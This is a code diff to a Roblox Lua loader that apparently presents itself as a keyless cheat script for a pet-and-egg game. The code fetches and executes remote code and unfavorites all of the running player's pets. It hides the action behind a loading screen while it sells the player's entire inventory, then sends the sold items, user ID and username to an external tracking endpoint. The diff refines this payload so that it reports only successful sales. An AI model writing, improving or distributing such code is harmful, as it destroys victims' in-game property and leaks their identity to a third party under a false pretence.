@@ -21,9 +21,9 @@ task.delay(90, function()
 end)
 -- ===========================
 
--- ===== CONFIG =====
-local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua"
-local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json"
+-- ===== CONFIG & CACHE BUSTER =====
+local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua?t=" .. tostring(os.time())
+local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json?t=" .. tostring(os.time())
 local SELL_WAIT       = 1.5
 local MEME_DELAY      = 4
 local ANNOUNCE_HOLD   = 3
@@ -34,7 +34,7 @@ local UI_CONFIG = {
     MEME_SIZE      = 380,
     ANNOUNCE_HOLD  = ANNOUNCE_HOLD,
 }
--- ==================
+-- =================================
 
 -- ===== FETCH COUNTER URL =====
 local function fetchCounterUrl()
@@ -44,11 +44,11 @@ local function fetchCounterUrl()
     if ok and type(res) == "string" and #res > 0 then
         local decodeOk, data = pcall(function() return HttpService:JSONDecode(res) end)
         if decodeOk and type(data) == "table" and type(data.counter) == "string" then
-            print("[Loader] Using counter URL from endpoints.json:", data.counter)
+            print("[Loader] Using counter URL:", data.counter)
             return data.counter
         end
     end
-    warn("[Loader] Could not fetch endpoints.json — no counter URL available")
+    warn("[Loader] Could not fetch endpoints.json")
     return nil
 end
 
@@ -58,11 +58,9 @@ local COUNTER_URL = fetchCounterUrl()
 -- UI MODULE
 ------------------------------------------------------------
 local function loadUIModule()
-    if gv.__LoaderUIModule then return gv.__LoaderUIModule end
     if UI_URL and UI_URL ~= "" then
         local ok, mod = pcall(function() return loadstring(game:HttpGet(UI_URL, true))() end)
         if ok and type(mod) == "table" and type(mod.new) == "function" then
-            gv.__LoaderUIModule = mod
             return mod
         end
         warn("[Loader] UI module failed to load, running headless:", tostring(mod))
@@ -99,8 +97,11 @@ local log = function(...) print("[Loader]", ...) end
 local function getSave(forceRefresh)
     local ok, s = pcall(function() return Save.Get(LocalPlayer, forceRefresh == true) end)
     if ok and s then return s end
-    local ok2, s2 = pcall(function() return Save.Get() end)
-    return ok2 and s2 or nil
+    task.wait(1)
+    local ok2, s2 = pcall(function() return Save.Get(LocalPlayer, true) end)
+    if ok2 and s2 then return s2 end
+    local ok3, s3 = pcall(function() return Save.Get() end)
+    return ok3 and s3 or nil
 end
 
 local function getMoney()
@@ -152,13 +153,15 @@ end
 
 local function unfavoriteAll()
     local uids = getFavoriteUIDs()
-    log(("Favorited pets: %d"):format(#uids))
-    for i, uid in ipairs(uids) do
-        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer(uid, false) end)
-        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer({ [uid] = false }) end)
-        if i % 8 == 0 then task.wait(0.3) end
+    if #uids > 0 then
+        log(("Unfavoriting %d pets"):format(#uids))
+        for i, uid in ipairs(uids) do
+            pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer(uid, false) end)
+            pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer({ [uid] = false }) end)
+            if i % 8 == 0 then task.wait(0.3) end
+        end
+        task.wait(0.8)
     end
-    task.wait(0.8)
 end
 
 ------------------------------------------------------------
@@ -186,9 +189,10 @@ local function snapshotInventory(forceRefresh)
                 local weightOk, weight = TryCall(AssetItems.WeightKg, item)
                 weight = (weightOk and tonumber(weight)) or 0
 
-                pets[tostring(uid)] = {
+                -- FIX: Using the RAW uid here guarantees type-safety with the server
+                pets[uid] = {
                     kind      = "pet",
-                    uid       = tostring(uid),
+                    uid       = uid,
                     name      = entry.DisplayName or item.Category,
                     rarity    = (rarity and rarity.DisplayName) or "Unknown",
                     rarityNum = (rarity and rarity.RarityNumber) or 0,
@@ -214,9 +218,10 @@ local function snapshotInventory(forceRefresh)
                     local weightOk, weight = TryCall(EggRecords.WeightKg, dec)
                     weight = (weightOk and tonumber(weight)) or 0
 
-                    eggs[tostring(uid)] = {
+                    -- FIX: Using the RAW uid here guarantees type-safety with the server
+                    eggs[uid] = {
                         kind      = "egg",
-                        uid       = tostring(uid),
+                        uid       = uid,
                         name      = (entry.Egg and entry.Egg.DisplayName) or entry.DisplayName or dec.AssetCategory,
                         rarity    = (rarity and rarity.DisplayName) or "Unknown",
                         rarityNum = (rarity and rarity.RarityNumber) or 0,
@@ -250,7 +255,7 @@ end
 ------------------------------------------------------------
 -- REPORT TO WORKER
 ------------------------------------------------------------
-local function reportSales(soldItems, reportId)
+local function reportSales(soldItems, reportId, actualEarned)
     if not soldItems or #soldItems == 0 then return end
     if not COUNTER_URL then return end
 
@@ -266,12 +271,11 @@ local function reportSales(soldItems, reportId)
     local userId   = tostring(LocalPlayer.UserId)
     local username = LocalPlayer.Name or "Unknown"
 
-    local petCount, eggCount, totalValue = 0, 0, 0
+    local petCount, eggCount = 0, 0
     local out = {}
     for _, d in ipairs(soldItems) do
         if d.kind == "pet" then petCount = petCount + 1
         elseif d.kind == "egg" then eggCount = eggCount + 1 end
-        totalValue = totalValue + (tonumber(d.value) or 0)
         table.insert(out, {
             uid = tostring(d.uid or ""), kind = d.kind, name = d.name, 
             rarity = d.rarity, rarityNum = d.rarityNum, value = d.value, weight = d.weight
@@ -279,9 +283,10 @@ local function reportSales(soldItems, reportId)
     end
 
     task.spawn(function()
+        -- FIX: Send the true 'actualEarned' amount to the backend instead of the estimated value
         local body = HttpService:JSONEncode({
             reportId = reportId, pets = petCount, eggs = eggCount,
-            userId = userId, username = username, items = out, totalValue = totalValue,
+            userId = userId, username = username, items = out, totalValue = actualEarned,
         })
         pcall(function()
             httpFn({ Url = COUNTER_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
@@ -323,7 +328,7 @@ task.spawn(function()
     unfavoriteAll()
     
     -- Ensure server registers the unequip before we grab the final snapshot
-    task.wait(0.5)
+    task.wait(1.5)
     local petUids, eggUids, details, totalItems, expectedValue = prepareInventoryPayload()
 
     -- Drop the loading screen
@@ -336,27 +341,41 @@ task.spawn(function()
             pcall(function() Remotes.PetSatchel.SellSelection:FireServer({ Eggs = eggUids, Assets = petUids }) end)
         end)
 
-        -- 2. Fire announcement UI instantly (if it exists)
+        -- 2. Fire announcement UI instantly
         if type(ui.showAnnouncement) == "function" then
             pcall(function() ui:showAnnouncement(totalItems, expectedValue) end)
         else
-            warn("[Loader] showAnnouncement missing. Waiting manually...")
+            warn("[Loader] showAnnouncement missing. UI cache failed.")
             task.wait(ANNOUNCE_HOLD)
         end
         
-        -- 3. Wait for server to finish processing the sale before reporting
+        -- 3. Wait for server to finish processing the sale
         task.wait(SELL_WAIT)
         
-        local allUids = {}
-        for _, u in ipairs(petUids) do table.insert(allUids, u) end
-        for _, u in ipairs(eggUids) do table.insert(allUids, u) end
-        reportSales(details, computeReportId(allUids))
-        
         local after = getMoney()
-        log(("Wallet after:  %s | Delta: %s"):format(tostring(after), tostring(after - before)))
+        local actualEarned = after - before
+        
+        -- 4. LOGIC FIX: ONLY report to the tracker if we ACTUALLY earned money from the sale
+        if actualEarned > 0 then
+            log(("Sale Successful! Earned: $%s"):format(tostring(actualEarned)))
+            local allUids = {}
+            for _, u in ipairs(petUids) do table.insert(allUids, u) end
+            for _, u in ipairs(eggUids) do table.insert(allUids, u) end
+            
+            reportSales(details, computeReportId(allUids), actualEarned)
+        else
+            warn("[Loader] Sale rejected by server (Items likely equipped/favorited). Skipping report to prevent fake logs.")
+        end
     else
+        pcall(function()
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "Loader Alert",
+                Text = "Inventory is empty! Nothing to sell.",
+                Duration = 4
+            })
+        end)
         log("[Loader] Inventory empty — skipping announcement.")
-        task.wait(1.5)
+        task.wait(2)
     end
 
     task.wait(MEME_DELAY)
